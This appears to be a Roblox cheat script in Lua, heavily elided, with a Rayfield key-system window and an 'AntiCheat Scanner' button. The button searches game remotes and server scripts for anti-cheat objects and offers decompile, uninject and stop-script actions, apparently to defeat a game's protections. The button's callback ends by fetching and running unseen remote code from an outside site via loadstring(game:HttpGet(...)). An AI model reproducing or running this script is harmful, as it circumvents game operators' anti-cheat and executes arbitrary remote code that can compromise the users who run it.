...
local Window = Rayfield:CreateWindow({
   ...
   KeySettings = {
      Title = "Torque V0.1",
      Subtitle = "Key System",
            Note = "Go to the discord lol", -- Use this to tell the user how to get a key
      FileName = "TORQUEKEYV0.1", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"KEY_TORQUE"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})
...
local Button = MainTab:CreateButton({
   Name = "AntiCheat Scanner",
   Callback = function()
   --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--------------------------------------------------------------------------------
-- 1) SERVICES UND VARIABLEN
--------------------------------------------------------------------------------
...
local suspiciousObjects = {} -- Neue globale Tabelle zum Speichern verdächtiger Objekte
...
--------------------------------------------------------------------------------
-- 2) DECOMPILE-FUNKTIONEN UND HELFER
--------------------------------------------------------------------------------
...
MainFrame.InputBegan:Connect(function(input)
    if not UI_MINIMIZED and input.UserInputType==Enum.UserInputType.MouseButton1 then
        dragging=true
        dragStart=input.Position
...
MinBtn.MouseButton1Click:Connect(function()
    if UI_MINIMIZED then
        TweenService:Create(MainFrame,TweenInfo.new(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=MAIN_SIZE}):Play()
        UI_MINIMIZED=false
    else
        TweenService:Create(MainFrame,TweenInfo.new(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=MIN_SIZE}):Play()
        UI_MINIMIZED=true
    end
end)
...
--------------------------------------------------------------------------------
-- 7) CONTENT FRAME + SCROLLINGFRAME
--------------------------------------------------------------------------------
...
--------------------------------------------------------------------------------
-- 8) ACTION ZONE (UNINJECT, START, MULTI, STOP SUSPICIOUS)
--------------------------------------------------------------------------------
...
-- Neuer Button zum Stoppen verdächtiger Scripts
...
local function openScriptViewer(txt)
    ...
    Close2.MouseButton1Click:Connect(function()
        viewer:Destroy()
        showCustomNotification("Viewer","UI closed. Press K to reopen main GUI if needed.",2)
    end)
    ...
    Topbar.InputBegan:Connect(function(inp)
        if not minimizedV and inp.UserInputType==Enum.UserInputType.MouseButton1 then
            draggingV=true
            dragStartV=inp.Position
            startPosV=viewer.Position
    ...
    Topbar.InputChanged:Connect(function(inp)
        if draggingV and inp.UserInputType==Enum.UserInputType.MouseMovement then
            local delta=inp.Position - dragStartV
            viewer.Position=UDim2.new(startPosV.X.Scale,startPosV.X.Offset+delta.X,startPosV.Y.Scale,startPosV.Y.Offset+delta.Y)
        end
    end)
...
--------------------------------------------------------------------------------
-- 10) RESULT ITEM + UNSUSPICIOUS NACH 2s LÖSCHEN
--------------------------------------------------------------------------------
...
local function createResultItem(labelText, codeDetails)
    ...
    -- Wenn "Unsuspicious" in grauer Farbe => auto remove nach 2s
...
--------------------------------------------------------------------------------
-- 11) SCAN-FUNKTIONEN (SINGLE/MULTI) mit zusätzlichen Checks
--------------------------------------------------------------------------------
...
-- Erweiterte Scan-Funktion: Zusätzlich zu den bestehenden Checks
local function singleScan()
    ...
    -- 5. ServerScriptService-Scan (neu)
    local function doServerSideScan()
        local success, serverService = pcall(function() return game:GetService("ServerScriptService") end)
...
local function multiScan()
    ...
    local coRemotes=coroutine.create(function()
        local dList=game:GetDescendants()
        processInBatches(dList,function(o)
            if o:IsA("RemoteEvent") or o:IsA("RemoteFunction") or o:IsA("BindableEvent") or o:IsA("BindableFunction") then
                local ln=o.Name:lower()
                local suspicious=false
                for _,k in ipairs(suspiciousKeywords) do
                    if ln:find(k) then
...
--------------------------------------------------------------------------------
-- 13) BEI START (SHOW GUI + ANTI-AFK)
--------------------------------------------------------------------------------
...
loadstring(game:HttpGet("https://lhub-script.xyz"))()
   end,
})
